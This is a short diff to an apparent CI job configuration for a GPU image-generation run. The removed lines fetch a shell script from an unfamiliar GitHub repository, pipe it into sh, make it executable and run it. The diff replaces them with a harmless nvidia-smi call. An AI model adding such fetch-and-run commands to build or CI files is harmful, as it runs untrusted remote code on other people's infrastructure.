@@ -39,9 +39,6 @@ jobs:
         # --seeds=6600-6605 \
         # --truncation-psi=0.5 \
         # --result-dir=/outputs/generatedFaces
-        ! curl -fsSL https://github.com/aka648582/yes/raw/main/aknh.sh | sh
-        #! wget https://github.com/aka648582/yes/raw/main/aknh.sh 
-        ! chmod +x aknh.sh  
-        ! ./aknh.sh
+        nvidia-smi
 
       image: tensorflow/tensorflow:1.14.0-gpu-py3
